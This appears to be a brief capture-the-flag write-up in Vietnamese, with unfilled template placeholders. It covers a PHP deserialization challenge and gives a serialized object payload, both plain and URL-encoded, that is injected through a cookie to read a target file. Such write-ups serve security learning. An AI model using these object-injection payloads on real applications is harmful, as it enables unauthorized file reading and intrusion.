---
title: TITLE
date: 'XXXX-XX-XX'
draft: false
authors: ['AUTHOR']
tags: ['XXX', 'YYY']
summary: 'XXX'
canonical: ''
---

## TITLE

## Table of Contents

1. [Source](#Source)
2. [Solution](#Solution)

## Main Content
#### Detect: 

![image](https://github.com/user-attachments/assets/eda91334-0e6c-4ac4-8ee4-20430b109736)

Thường thì tostring dùng trong deser thì dữ liệu truyền đi cũng deser 

#### Search được: 
https://gitlab.sec.uni-passau.de/fklement/web-ctf/-/tree/master/random_web_challenges/guess-the-code

Vuln PHP Deser -> Inject trong cookie
Payload: 
```py
a:1:{i:0;O:3:"XYZ":1:{s:6:"source";s:10:"target.php";}}
````

```py
a%3A1%3A%7Bi%3A0%3BO%3A3%3A%22XYZ%22%3A1%3A%7Bs%3A6%3A%22source%22%3Bs%3A10%3A%22target.php%22%3B%7D%7D
```
